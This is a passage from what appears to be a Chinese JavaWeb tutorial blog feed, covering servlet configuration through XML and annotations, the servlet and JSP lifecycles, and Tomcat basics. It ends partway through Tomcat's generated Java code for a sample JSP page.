title="常用Servlet"></a>常用Servlet</h3><p><strong>GenericServlet</strong></p><p>GenericServlet为Servlet接口的实现类，它实现了init、getServletConfig、getServletInfo、destroy方法，service方法为抽象方法。</p><p><strong>HttpServlet</strong></p><p>HttpServlet继承了GenericServlet类，实现了service方法，增加了多个请求方式对应的处理方法。httpservlet可获取客户端请求的方式，进而把请求交给对应方式的方法处理。</p><h3 id="Servlet生命周期"><a href="#Servlet生命周期" class="headerlink" title="Servlet生命周期"></a>Servlet生命周期</h3><p>Servlet对象是用户第一次访问时创建，对象创建之后就驻留在内存里面了，响应后续的请求。Servlet对象一旦被创建，init()方法就会被执行，客户端的每次请求导致service()方法被执行，Servlet对象被摧毁时(Web服务器停止后或者Web应用从服务器里删除时)，destory()方法就会被执行。</p><p><img src="https://images-roland.oss-cn-shenzhen.aliyuncs.com//blog/20190417153309.png"></p><h3 id="Servet开发步骤"><a href="#Servet开发步骤" class="headerlink" title="Servet开发步骤"></a>Servet开发步骤</h3><h3 id="创建Servlet"><a href="#创建Servlet" class="headerlink" title="创建Servlet"></a>创建Servlet</h3><h3 id="配置Servlet"><a href="#配置Servlet" class="headerlink" title="配置Servlet"></a>配置Servlet</h3><h3 id="通过xml文件配置"><a href="#通过xml文件配置" class="headerlink" title="通过xml文件配置"></a>通过xml文件配置</h3><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>servlet节点名称<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>类文件路径<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">load-on-startup</span>&gt;</span>值<span class="hljs-tag">&lt;/<span class="hljs-name">load-on-startup</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>servlet节点名称<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>地址名称<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span></code></pre></div><table><thead><tr><th>属性</th><th>作用</th></tr></thead><tbody><tr><td>servlet</td><td>定义servlet节点</td></tr><tr><td>servlet-name</td><td>servlet的名称</td></tr><tr><td>servlet-class</td><td>servlet对应的类</td></tr><tr><td>load-on-startup</td><td>加载</td></tr><tr><td>init-param</td><td></td></tr><tr><td>servlet-mapping</td><td>定义servlet的url映射</td></tr><tr><td>servlet-name</td><td>servlet名称</td></tr><tr><td>url-pattern</td><td>url匹配模式</td></tr></tbody></table><h3 id="通过注解配置"><a href="#通过注解配置" class="headerlink" title="通过注解配置"></a>通过注解配置</h3><p>(该方式需servlet3.0)</p><p>@WebServlet(name &#x3D; “XXX”,value &#x3D; “&#x2F;XXX”)</p><p>public class httpservlet extends HttpServlet {</p><p>}</p><p>@WebServlet()常用属性</p><p>name：指定Servlet 的 name属性，等价于 。如果没有显式指定，则该 Servlet 的取值即为类的全限定名。</p><p>value：等价于urlPatterns，两者不能同时使用。</p><p>urlPatterns：指定一组servlet的URL匹配模式，等价于url-pattern。</p><p>load-on-startup：指定servlet的加载顺序。</p><h3 id="使用Servlet"><a href="#使用Servlet" class="headerlink" title="使用Servlet"></a>使用Servlet</h3><p>例如，在jsp的form表单的action中引用servlet</p><h3 id="HttpServlet开发示例"><a href="#HttpServlet开发示例" class="headerlink" title="HttpServlet开发示例"></a>HttpServlet开发示例</h3><h3 id="通过XML开发"><a href="#通过XML开发" class="headerlink" title="通过XML开发"></a>通过XML开发</h3><h3 id="创建Servlet-1"><a href="#创建Servlet-1" class="headerlink" title="创建Servlet"></a>创建Servlet</h3><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.Servlet;<span class="hljs-keyword">import</span> javax.servlet.ServletException;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyHttpServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;        System.out.println(<span class="hljs-string">&quot;=====MyHttpServlet--doPost=====&quot;</span>);        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;name&quot;</span>);        resp.getWriter().write(name);    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;        <span class="hljs-built_in">super</span>.service(req, resp);    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;        System.out.println(<span class="hljs-string">&quot;=====MyHttpServlet--destroy=====&quot;</span>);    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ServletException &#123;        System.out.println(<span class="hljs-string">&quot;=====MyHttpServlet--init=====&quot;</span>);    &#125;&#125;</code></pre></div><h3 id="配置Servlet-1"><a href="#配置Servlet-1" class="headerlink" title="配置Servlet"></a>配置Servlet</h3><p>web.xml</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>MyHttpServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.example.Servlet.MyHttpServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">load-on-startup</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">load-on-startup</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>MyHttpServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/hello<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span></code></pre></div><p>jsp</p><div class="code-wrapper"><pre><code class="hljs java">&lt;html&gt;&lt;body&gt;&lt;h2&gt;Hello World!&lt;/h2&gt;&lt;form action=<span class="hljs-string">&quot;/ByXml/hello&quot;</span>  method=<span class="hljs-string">&quot;post&quot;</span>&gt;    &lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;name&quot;</span>&gt;    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;Submit&quot;</span>&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre></div><h3 id="通过注解开发"><a href="#通过注解开发" class="headerlink" title="通过注解开发"></a>通过注解开发</h3><h3 id="创建和配置Servlet"><a href="#创建和配置Servlet" class="headerlink" title="创建和配置Servlet"></a>创建和配置Servlet</h3><p>MyHttpServlet.java</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.Servlet;<span class="hljs-keyword">import</span> javax.servlet.ServletException;<span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-comment">//注解</span><span class="hljs-meta">@WebServlet(name = &quot;myServlet&quot;, value = &quot;/myServlet&quot;)</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyHttpServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;        System.out.println(<span class="hljs-string">&quot;=====MyHttpServlet--doPost=====&quot;</span>);        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;name&quot;</span>);        resp.getWriter().write(name);    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;        <span class="hljs-built_in">super</span>.service(req, resp);    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;        System.out.println(<span class="hljs-string">&quot;=====MyHttpServlet--destroy=====&quot;</span>);    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ServletException &#123;        System.out.println(<span class="hljs-string">&quot;=====MyHttpServlet--init=====&quot;</span>);    &#125;&#125;</code></pre></div><p>index.jsp</p><div class="code-wrapper"><pre><code class="hljs java">&lt;html&gt;&lt;body&gt;&lt;h2&gt;Hello World!&lt;/h2&gt;&lt;form action=<span class="hljs-string">&quot;/ByAnnotation/myServlet&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span>&gt;    &lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;name&quot;</span>&gt;    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;Submit&quot;</span>&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre></div><h2 id="执行顺序"><a href="#执行顺序" class="headerlink" title="执行顺序"></a>执行顺序</h2><p>listener.init</p><p>filter.init</p><p>servlet.init</p><p>filter.doFilter</p><p>servlet.service</p><p>servlet.destory</p><p>filter.destory</p><p>listen.destory</p><h1 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1><p>Tomcat是一种B&#x2F;S架构服务器，支持servlet规范，客户端默认采用UTF-8字符格式发数据，服务器端默认采用ISO8859-1字符格式处理数据。因此开发JavaWeb时需要考虑到字符编码问题。</p><p>tomcat目录文件夹：</p><p>conf：存放配置文件，server.xml是tomcat服务的配置文件，web.xml是项目的配置文件。</p><p>webapps：存放打包的web项目。</p>]]></content>
    
    
    <categories>
      
      <category>编程技术</category>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JSP</title>
    <link href="/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/JavaWeb/Jsp/"/>
    <url>/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/JavaWeb/Jsp/</url>
    
    <content type="html"><![CDATA[<h1 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h1><h2 id="导入依赖"><a href="#导入依赖" class="headerlink" title="导入依赖"></a>导入依赖</h2><p>tomcat对jsp页面的支持</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javax.servlet-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>provided<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre></div><h2 id="jsp运行过程"><a href="#jsp运行过程" class="headerlink" title="jsp运行过程"></a>jsp运行过程</h2><div class="code-wrapper"><pre><code class="hljs angelscript">请求JSP的流程大致如下：在第一次请求相应的JSP时，会将jsp进行一轮jsp语法的解析，解析主要是从jsp的语法解析到java语法，在默认为work的目录下生成相应的java文件(内容本质是一个Servlet)，之后在对java文件进行编译，生成对应的<span class="hljs-keyword">class</span>文件并且加载到<span class="hljs-symbol">JVM</span>中。</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230820164829124.png"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://mp.weixin.qq.com/s/-JyUsgWJjfvS8dmeuhTB9w">https://mp.weixin.qq.com/s/-JyUsgWJjfvS8dmeuhTB9w</a></p><h2 id="jsp生命周期"><a href="#jsp生命周期" class="headerlink" title="jsp生命周期"></a>jsp生命周期</h2><p>编译</p><p>初始化</p><div class="code-wrapper"><pre><code class="hljs typescript"><span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">_jspInit</span>(<span class="hljs-params"></span>) &#123;&#125;</code></pre></div><p>服务</p><div class="code-wrapper"><pre><code class="hljs typescript"><span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">_jspService</span>(<span class="hljs-params"></span>) &#123;&#125;</code></pre></div><p>销毁</p><div class="code-wrapper"><pre><code class="hljs typescript"><span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">_jspDestroy</span>(<span class="hljs-params"></span>) &#123;&#125;</code></pre></div><p><strong>测试代码</strong></p><div class="code-wrapper"><pre><code class="hljs erb"><span class="language-xml">&lt;%</span><span class="language-ruby">@ page language=<span class="hljs-string">&quot;java&quot;</span> contentType=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span></span><span class="language-ruby">         pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span></span><span class="language-xml">%&gt;</span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>demo01<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><span class="language-xml"></span><span class="language-xml">&lt;%</span><span class="language-ruby">!</span><span class="language-ruby">    <span class="hljs-keyword">private</span> int initVar=<span class="hljs-number">0</span>;</span><span class="language-ruby">    <span class="hljs-keyword">private</span> int serviceVar=<span class="hljs-number">0</span>;</span><span class="language-ruby">    <span class="hljs-keyword">private</span> int destroyVar=<span class="hljs-number">0</span>;</span><span class="language-ruby"></span><span class="language-ruby">    <span class="hljs-keyword">public</span> void jspInit()&#123;</span><span class="language-ruby">        initVar++;</span><span class="language-ruby">        <span class="hljs-title class_">System</span>.out.println(<span class="hljs-string">&quot;jspInit(): JSP被初始化了&quot;</span>+initVar+<span class="hljs-string">&quot;次&quot;</span>);</span><span class="language-ruby">    &#125;</span><span class="language-ruby">    <span class="hljs-keyword">public</span> void jspDestroy()&#123;</span><span class="language-ruby">        destroyVar++;</span><span class="language-ruby">        <span class="hljs-title class_">System</span>.out.println(<span class="hljs-string">&quot;jspDestroy(): JSP被销毁了&quot;</span>+destroyVar+<span class="hljs-string">&quot;次&quot;</span>);</span><span class="language-ruby">    &#125;</span><span class="language-ruby"></span><span class="language-xml">%&gt;</span><span class="language-xml"></span><span class="language-xml">&lt;%</span><span class="language-ruby"></span><span class="language-ruby">    serviceVar++;</span><span class="language-ruby">    <span class="hljs-title class_">System</span>.out.println(<span class="hljs-string">&quot;_jspService(): JSP共响应了&quot;</span>+serviceVar+<span class="hljs-string">&quot;次请求&quot;</span>);</span><span class="language-ruby"></span><span class="language-ruby">    <span class="hljs-title class_">String</span> content1=<span class="hljs-string">&quot;初始化阶段：初始化次数 : &quot;</span>+initVar;</span><span class="language-ruby">    <span class="hljs-title class_">String</span> content2=<span class="hljs-string">&quot;执行阶段：响应客户端请求次数 : &quot;</span>+serviceVar;</span><span class="language-ruby">    <span class="hljs-title class_">String</span> content3=<span class="hljs-string">&quot;销毁阶段：销毁次数 : &quot;</span>+destroyVar;</span><span class="language-ruby"></span><span class="language-xml">%&gt;</span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Jsp生命周期-测试实例<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>&lt;%=</span><span class="language-ruby">content1 </span><span class="language-xml">%&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>&lt;%=</span><span class="language-ruby">content2 </span><span class="language-xml">%&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>&lt;%=</span><span class="language-ruby">content3 </span><span class="language-xml">%&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><span class="language-xml"></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span></code></pre></div><p><strong>tomcat解析后的java代码</strong></p><div class="code-wrapper"><pre><code class="hljs gradle"><span class="hljs-comment">/*</span><span class="hljs-comment"> * Generated by the Jasper component of Apache Tomcat</span><span class="hljs-comment"> * Version: Apache Tomcat/8.5.50</span><span class="hljs-comment"> * Generated at: 2023-08-20 08:58:44 UTC</span><span class="hljs-comment"> * <span class="hljs-doctag">Note:</span> The last modified time of this file was set to</span><span class="hljs-comment"> *       the last modified time of the source file after</span><span class="hljs-comment"> *       generation to assist with modification tracking.</span><span class="hljs-comment"> */</span><span class="hljs-keyword">package</span> org.apache.jsp;<span class="hljs-keyword">import</span> javax.servlet.*;<span class="hljs-keyword">import</span> javax.servlet.http.*;<span class="hljs-keyword">import</span> javax.servlet.jsp.*;<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> index_jsp <span class="hljs-keyword">extends</span> org.apache.jasper.<span class="hljs-keyword">runtime</span>.HttpJspBase    <span class="hljs-keyword">implements</span> org.apache.jasper.<span class="hljs-keyword">runtime</span>.JspSourceDependent,                 org.apache.jasper.<span class="hljs-keyword">runtime</span>.JspSourceImports &#123;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> initVar=<span class="hljs-number">0</span>;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> serviceVar=<span class="hljs-number">0</span>;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> destroyVar=<span class="hljs-number">0</span>;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> jspInit()&#123;        initVar++;        System.out.<span class="hljs-keyword">println</span>(<span class="hljs-string">&quot;jspInit(): JSP被初始化了&quot;</span>+initVar+<span class="hljs-string">&quot;次&quot;</span>);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> jspDestroy()&#123;        destroyVar++;        System.out.<span class="hljs-keyword">println</span>(<span class="hljs-string">&quot;jspDestroy(): JSP被销毁了&quot;</span>+destroyVar+<span class="hljs-string">&quot;次&quot;</span>);    &#125;  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> javax.servlet.jsp.JspFactory _jspxFactory =          javax.servlet.jsp.JspFactory.getDefaultFactory();  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> java.util.Map&lt;java.lang.String,java.lang.<span class="hljs-keyword">Long</span>&gt; _jspx_dependants;  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> java.util.Set&lt;java.lang.String&gt; _jspx_imports_packages;  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> java.util.Set&lt;java.lang.String&gt; _jspx_imports_classes;  <span class="hljs-keyword">static</span> &#123;    _jspx_imports_packages = <span class="hljs-keyword">new</span> java.util.HashSet&lt;&gt;();    _jspx_imports_packages.add(<span class="hljs-string">&quot;javax.servlet&quot;</span>);    _jspx_imports_packages.add(<span class="hljs-string">&quot;javax.servlet.http&quot;</span>);    _jspx_imports_packages.add(<span class="hljs-string">&quot;javax.servlet.jsp&quot;</span>);    _jspx_imports_classes = <span class="hljs-keyword">null</span>;  &#125;  <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> javax.el.ExpressionFactory _el_expressionfactory;  <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> org.apache.tomcat.InstanceManager _jsp_instancemanager;  <span class="hljs-keyword">public</span> java.util.Map&lt;java.lang.String,java.lang.<span class="hljs-keyword">Long</span>&gt; getDependants() &#123;    <span class="hljs-keyword">return</span> _jspx_dependants;  &#125;  <span class="hljs-keyword">public</span> java.util.Set&lt;java.lang.String&gt; getPackageImports() &#123;    <span class="hljs-keyword">return</span> _jspx_imports_packages;  &#125;  <span class="hljs-keyword">public</span> java.util.Set&lt;java.lang.String&gt; getClassImports() &#123;    <span class="hljs-keyword">return</span> _jspx_imports_classes;  &#125;  <span class="hljs-keyword">public</span> javax.el.ExpressionFactory _jsp_getExpressionFactory() &#123;    <span class="hljs-keyword">if</span> (_el_expressionfactory == <span class="hljs-keyword">null</span>) &#123;      <span class="hljs-keyword">synchronized</span> (<span class="hljs-keyword">this</span>) &#123;        <span class="hljs-keyword">if</span> (_el_expressionfactory == <span class="hljs-keyword">null</span>) &#123;          _el_expressionfactory = _jspxFactory.getJspApplicationContext(getServletConfig().getServletContext()).getExpressionFactory();        &#125;      &#125;    &#125;    <span class="hljs-keyword">return</span> _el_expressionfactory;  &#125;  <span class="hljs-keyword">public</span> org.apache.tomcat.InstanceManager _jsp_getInstanceManager() &#123;    <span class="hljs-keyword">if</span> (_jsp_instancemanager == <span class="hljs-keyword">null</span>) &#123;      <span class="hljs-keyword">synchronized</span> (<span class="hljs-keyword">this</span>) &#123;        <span class="hljs-keyword">if</span> (_jsp_instancemanager == <span class="hljs-keyword">null</span>) &#123;          _jsp_instancemanager = org.apache.jasper.<span class="hljs-keyword">runtime</span>.InstanceManagerFactory.getInstanceManager(getServletConfig());        &#125;      &#125;    &#125;    <span class="hljs-keyword">return</span> _jsp_instancemanager;  &#125;  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> _jspInit() &#123;  &#125;  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> _jspDestroy() &#123;  &#125;  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> _jspService(<span class="hljs-keyword">final</span> javax.servlet.http.HttpServletRequest request, <span class="hljs-keyword">final</span> javax.servlet.http.HttpServletResponse response)      <span class="hljs-keyword">throws</span> java.io.IOException, javax.servlet.ServletException &#123;    <span class="hljs-keyword">final</span> java.lang.String _jspx_method = request.getMethod();    <span class="hljs-keyword">if</span> (!<span class="hljs-string">&quot;GET&quot;</span>.equals(_jspx_method) &amp;&amp; !<span class="hljs-string">&quot;POST&quot;</span>.equals(_jspx_method) &amp;&amp; !<span class="hljs-string">&quot;HEAD&quot;</span>.equals(_jspx_method) &amp;&amp; !javax.servlet.DispatcherType.ERROR.equals(request.getDispatcherType())) &#123;      response.sendError(HttpServletResponse.SC_METHOD_NOT_ALLOWED, <span class="hljs-string">&quot;JSPs only permit GET POST or HEAD&quot;</span>);      <span class="hljs-keyword">return</span>;    &#125;    <span class="hljs-keyword">final</span> javax.servlet.jsp.PageContext pageContext;    javax.servlet.http.HttpSession session = <span class="hljs-keyword">null</span>;    <span class="hljs-keyword">final</span> javax.servlet.ServletContext application;    <span class="hljs-keyword">final</span> javax.servlet.ServletConfig config;    javax.servlet.jsp.JspWriter out = <span class="hljs-keyword">null</span>;    <span class="hljs-keyword">final</span> java.lang.Object page = <span class="hljs-keyword">this</span>;    javax.servlet.jsp.JspWriter _jspx_out = <span class="hljs-keyword">null</span>;    javax.servlet.jsp.PageContext _jspx_page_context = <span class="hljs-keyword">null</span>;    <span class="hljs-keyword">try</span> &#123;      response.setContentType(<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>);      pageContext = _jspxFactory.getPageContext(<span class="hljs-keyword">this</span>, request, response,      <span class="hljs-keyword">null</span>, <span class="hljs-keyword">true</span>, <span class="hljs-number">8192</span>, <span class="hljs-keyword">true</span>);      _jspx_page_context = pageContext;      application = pageContext.getServletContext();      config = pageContext.getServletConfig();      session = pageContext.getSession();      out = pageContext.<span class="hljs-keyword">getOut</span>();      _jspx_out = out;      out.<span class="hljs-keyword">write</span>(<span class="hljs-string">&quot;\\\\n&quot;</span>);      out.<span class="hljs-keyword">write</span>(<span class="hljs-string">&quot;&lt;html&gt;\\\\n&quot;</span>);      out.<span class="hljs-keyword">write</span>(<span class="hljs-string">&quot;&lt;head&gt;\\\\n&quot;</span>);      out.<span class="hljs-keyword">write</span>(<span class="hljs-string">&quot;    &lt;title&gt;demo01&lt;/title&gt;\\\\n&quot;</span>);      out.<span class="hljs-keyword">write</span>(<span class="hljs-string">&quot;&lt;/head&gt;\\\\n&quot;</span>);      out.<span class="hljs-keyword">write</span>(<span class="hljs-string">&quot;&lt;body&gt;\\\\n&quot;</span>);      out.<span class="hljs-keyword">write</span>(<span class="hljs-string">&quot;\\\\n&quot;</span>);      out.<span class="hljs-keyword">write</span>(<span class="hljs-string">&#x27;\\\\n&#x27;</span>);      out.<span class="hljs-keyword">write</span>(<span class="hljs-string">&#x27;\\\\n&#x27;</span>);    serviceVar++;    System.out.<span class="hljs-keyword">println</span>(<span class="hljs-string">&quot;_jspService(): JSP共响应了&quot;</span>+serviceVar+<span class="hljs-string">&quot;次请求&quot;</span>);    String content1=<span class="hljs-string">&quot;初始化阶段：初始化次数 : &quot;</span>+initVar;    String content2=<span class="hljs-string">&quot;执行阶段：响应客户端请求次数 : &quot;</span>+serviceVar;    String content3=<span class="hljs-string">&quot;销毁阶段：销毁次数 : &quot;</span>+destroyVar;      out.<span class="hljs-keyword">write</span>(<span class="hljs-string">&quot;\\\\n&quot;</span>);      out.<span class="hljs-keyword">write</span>(<span class="hljs-string">&quot;&lt;h1&gt;Jsp生命周期-测试实例&lt;/h1&gt;\\\\n&quot;</span>);      out.<span class="hljs-keyword">write</span>(<span class="hljs-string">&quot;&lt;p&gt;&quot;</span>);      out.<span class="hljs-keyword">print</span>(content1 );      out.<span class="hljs-keyword">write</span>(<span class="hljs-string">&quot;&lt;/p&gt;\\\\n&quot;</span>);      out.<span class="hljs-keyword">write</span>(<span class="hljs-string">&quot;&lt;p&gt;&quot;</span>);      out.<span class="hljs-keyword">print</span>(content2 );      out.<span class="hljs-keyword">write</span>(<span class="hljs-string">&quot;&lt;/p&gt;\\\\n&quot;</span>);      out.<span class="hljs-keyword">write</span>(<span class="hljs-string">&quot;&lt;p&gt;&quot;</span>);      out.<span class="hljs-keyword">print</span>(content3 );      out.<span class="hljs-keyword">write</span>(<span class="hljs-string">&quot;&lt;/p&gt;\\\\n&quot;</span>);      out.<span class="hljs-keyword">write</span>(<span class="hljs-string">&quot;\\\\n&quot;</span>);      out.<span class="hljs-keyword">write</span>(<span class="hljs-string">&quot;&lt;/body&gt;\\\\n&quot;</span>);      out.<span 